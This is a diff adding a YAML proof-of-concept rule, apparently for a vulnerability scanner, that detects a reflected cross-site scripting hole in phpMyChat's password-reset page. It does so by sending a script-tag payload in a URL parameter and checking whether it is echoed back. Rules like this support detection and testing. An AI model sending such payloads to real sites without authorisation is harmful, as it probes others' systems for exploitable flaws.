@@ -1,0 +1,11 @@
+name: poc-yaml-phpMyChat-xss
+rules:
+  - method: GET
+    path: "plus/pass_reset.php?L=english&pmc_username=\"><script>alert('fsafazxc')</script>"
+    expression: |
+      response.status==200 && response.body.bcontains(b'fsafazxc')
+
+detail:
+  author: xiaoming
+  links:
+    - https://www.exploit-db.com/exploits/47798
